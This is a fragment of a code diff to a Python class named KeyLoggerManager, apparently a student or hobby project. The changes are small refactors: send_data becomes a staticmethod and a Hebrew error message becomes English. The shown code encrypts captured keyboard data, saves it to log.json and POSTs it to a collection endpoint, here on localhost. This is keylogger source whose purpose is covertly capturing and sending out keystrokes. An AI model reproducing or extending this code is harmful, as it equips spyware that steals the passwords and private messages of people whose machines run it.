@@ -26,17 +26,17 @@ class KeyLoggerManager:
             self._write_to_file(self.encrypt(data),'log.json')
             encrypted_data=self.encrypt(data)
             self.send_data(encrypted_data)
-
-    def send_data(self, data: dict):
+    @staticmethod
+    def send_data(data: dict):
         try:
-            response = requests.post(
+            requests.post(
                 "http://localhost:5555/home", 
                 json={"machine_name": "Test Machine", "data": data},
                 headers={'Content-Type': 'application/json'}
             )
             
         except Exception as e:
-            print(f" שגיאה בשליחת הנתונים: {e}")
+            print(f" Error sending data {e}")
     def stop_listening(self):
         """
          Stops listening to keyboard keys
